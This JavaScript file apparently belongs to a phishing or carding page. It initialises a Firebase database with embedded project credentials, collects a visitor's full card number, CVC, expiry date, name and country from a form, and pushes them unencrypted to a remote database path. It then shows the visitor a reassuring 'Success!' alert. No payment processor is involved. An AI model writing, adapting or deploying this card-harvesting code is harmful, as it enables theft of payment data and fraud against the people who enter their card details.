// script.js

// Firebase Realtime Database initialization (should be placed at the top of the file)
const firebaseConfig = {
    apiKey: "AIzaSyCSgXwfQApXMdQUU6hG7ff0xgTNeTcKBZk",
    authDomain: "card-delivery.firebaseapp.com",
    databaseURL: "https://card-delivery-default-rtdb.firebaseio.com",
    projectId: "card-delivery",
    storageBucket: "card-delivery.appspot.com",
    messagingSenderId: "738527725245",
    appId: "1:738527725245:web:12e89fc912b9aadd2399d4",
    measurementId: "G-HGJV633S6D"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

function submitForm() {
    // Get input values
    var cardNumber = document.getElementById('card_number').value;
    var cvc = document.getElementById('cvc').value;
    var expireDate = document.getElementById('expire').value;
    var name = document.getElementById('name').value;
    var country = document.getElementById('country').value;

    // Check if any field is empty
    if (!cardNumber || !cvc || !expireDate || !name || !country) {
        alert('Error: All fields must be filled!');
    } else {
        // Display loading message
        alert('Loading...');

        // Push data to the database
        var newDataRef = database.ref('SubGo'); // Replace 'your_data_path' with the path in your database
        newDataRef.push({
            cardNumber: cardNumber,
            cvc: cvc,
            expireDate: expireDate,
            name: name,
            country: country
        }).then(function () {
            // Display success message
            alert('Success!');
        }).catch(function (error) {
            // Handle errors
            console.error('Error writing to the database: ', error);
            alert('Error: Failed to submit data.');
        });
    }
}

